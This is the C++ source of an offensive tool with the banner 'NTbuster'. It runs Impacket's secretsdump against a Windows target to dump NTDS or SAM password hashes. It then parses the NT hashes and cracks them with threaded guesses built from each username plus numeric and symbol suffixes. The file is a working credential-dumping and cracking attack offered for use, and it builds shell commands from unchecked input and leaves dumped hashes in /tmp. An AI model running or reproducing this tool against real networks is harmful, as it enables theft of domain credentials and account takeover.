#include <iostream>
#include <vector>
#include "ntlm.h"
#include <fstream>
#include <sstream>
#include <cstdlib>
#include <unordered_map>
#include <regex>
#include <cstring>
#include <cstring>
#include <CLI/CLI.hpp>
#include <thread>
using namespace std;

class Cracker {
    public:
        string ip_address;
        string username;
        string password;
        string target;

        std::vector<string> generate(string username) {
            std::vector<string> usernames;
            std::string busername = username;
            std::vector<string> mixed_extensions = extender(extensions);
            for (const auto& extension : mixed_extensions) {    
                username.append(extension);
                usernames.push_back(username);
                username = busername;
            }
            return usernames;
        }

        void crack(std::vector<string> wordlist, const char* hash, const char* username){
            for (auto i = 0; i < wordlist.size(); i++) {
                const char* generated_hash = gen_ntlm(wordlist[i]);
                if (std::strcmp(hash, generated_hash) == 0) {
                    std::cout << "\033[32m" << "[+] " << "\033[1;32m" << "Cracked: " <<
                    "\033[0m" <<
                    "\033[32m" <<
                    "['" << username << "':" <<
                    "'" << wordlist[i] << "']" <<
                    "\033[0m" <<
                    std::endl;
                }
            }
        }
        
        string get_ntds() {
            std::string command = "/usr/bin/python3 ./scripts/secretsdump.py ";
            std::stringstream ss;
            ss << command << target << " > /tmp/output.txt";
            command = ss.str();
            system(command.c_str());
            ifstream fin("/tmp/output.txt");
            string output = "";
            while (fin) {
                string line;
                getline(fin, line);
                output += line + "\n";
            }
            return output;
        }

        std::unordered_map<std::string, std::string>  parse_hashes(const std::string& input) {        
            std::unordered_map<std::string, std::string> result;
            std::regex re("nthash\\)(.*?)\\[\\*\\]");
            std::regex re_for_dc("NTDS\\.DIT secrets(.*?)\\[\\*\\]");
            std::string modified_input = input; // Create a non-const copy of the input string
            std::string helper_for_regex = "\n";
            std::smatch match;
            size_t pos = 0;
            std::string matched_str;
            std::vector<std::string> split_result;
            std::vector<std::string> split_result_line;
            std::string token;
            std::string token_line;
            std::istringstream iss("");
            std::istringstream iss_line("");
            std::unordered_map<std::string, std::string> creds;
        
            while ((pos = modified_input.find(helper_for_regex, pos)) != std::string::npos) {
                modified_input.replace(pos, helper_for_regex.length(), "^");
                pos += 6; // Move past the replaced string
            }
            
            if (std::regex_search(modified_input, match, re_for_dc)) {
                matched_str = match[1].str();
            } else {
                match = std::smatch();
                if (std::regex_search(modified_input, match, re)) {        
                    matched_str = match[1].str();
                }
            };

            iss.str(matched_str);
            
            while (std::getline(iss, token, '^')){
                split_result.push_back(token);
            }

            for (const auto& str : split_result) {
                iss_line.clear();
                split_result_line.clear();
                iss_line.str(str);

                while (std::getline(iss_line, token, ':')){
                    split_result_line.push_back(token);
                }
                if (split_result_line.size() >= 3) {
                    creds[split_result_line[0]] = split_result_line[3];
                }
            }
            return creds;
        }

        void launch() {
            std::pair<bool, string> crack_status;
            std::vector<std::thread> threads;
            std::vector<std::pair<bool, std::string>> results;

            std::cout << "\033[33m" << "[*] Dumping hashes..." << 
                "\033[0m" <<
                std::endl;
            std::string output = get_ntds();
            
            if (output.length() > 0) {
                std::cout << "\033[32m" << "[+] Hashes dumped!" << 
                    "\033[0m" <<
                    std::endl;
            } else {
                return;
            }
            std::cout << "\033[33m" << "[*] Parsing dumped hashes..." << 
                "\033[0m" <<
                std::endl;
            std::unordered_map<std::string, std::string> creds = parse_hashes(output);

            for (const auto& kv : creds) {
                std::cout << "\033[33m" << "[*] The password of '" << 
                    kv.first << "' is cracking..." 
                    "\033[0m" <<
                    std::endl;
                std::vector<string> wl = generate(kv.first);
                threads.emplace_back(
                    &Cracker::crack, this, wl, kv.second.c_str(), kv.first.c_str()
                );
                if (threads.size() == 10) {
                    for (auto& thread : threads) {
                        thread.join();
                    }
                    threads.clear();
                }
            }
        }

    private:
        std::vector<std::string> extensions = {
            "123456",
            "654321",
            "1234567",
            "7654321",
            "12345678",
            "87654321",
            "123456789",
            "987654321",
            "1234567890",
            "0987654321",
            "000",
            "001",
            "002",
            "003",
            "004",
            "005",
            "007",
            "008",
            "009"
    };

        std::vector<std::string> extender(std::vector<std::string> initial_extensions){
            std::vector<std::string> extensions;
            for (int i = 1; i < 99999; i++) {
                std::string str_i = std::to_string(i);
                extensions.push_back(str_i);
                extensions.push_back(str_i + "!");
                extensions.push_back(str_i + "!!");
                extensions.push_back(str_i + "!!!");
                extensions.push_back(str_i + "@");
                extensions.push_back(str_i + "!@#");
                extensions.push_back(str_i + "!@");
                extensions.push_back(str_i + "!@#$%");
                extensions.push_back(str_i + "!@#$%^");
            }
            initial_extensions.insert(initial_extensions.end(), 
                                        extensions.begin(), 
                                        extensions.end());
            return initial_extensions;
        }
    
};

int main(int argc, char** argv) {
    // draw banner
    const char* banner_text = "    _   __________               __           \n"
                     "   / | / /_  __/ /_  __  _______/ /____  _____\n"
                     "  /  |/ / / / / __ \\/ / / / ___/ __/ _ \\/ ___/\n"
                     " / /|  / / / / /_/ / /_/ (__  ) /_/  __/ /    \n"
                     "/_/ |_/ /_/ /_.___/\\__,_/____/\\__/\\___/_/     \n";
    cout << "\033[31m" << banner_text << "\033[0m" << endl;

    std::string python_check_command = "/usr/bin/python3 --version > /dev/null 2>&1";
    std::string impacket_check_command = "/usr/bin/python3 -c \"import impacket\" > /dev/null 2>&1";
 
    // Check if Python3 is installed
    if (system(python_check_command.c_str()) != 0) {
        std::cerr << "[-] Error: Python3 is not installed." << std::endl;
        return EXIT_FAILURE;
    }

    // Check if Impacket is installed
    if (system(impacket_check_command.c_str()) != 0) {
        std::cerr << "[-] Error: Impacket is not installed. Please install it by running 'pip3 install impacket'." << std::endl;
        return EXIT_FAILURE;
    }
    CLI::App app{"MyApp"};

    std::string ip_address, username, password;

    app.add_option("-t,--target-ip", ip_address, "Target IP address")->required();
    app.add_option("-u,--username", username, "Username")->required();
    app.add_option("-p,--password", password, "Password")->required();

    CLI11_PARSE(app, argc, argv);

    std::string target = username + ":" + password + "@" + ip_address;

    // Use the target value
    Cracker cracker;
    cracker.target = target;
    cracker.launch();

    return 0;
}
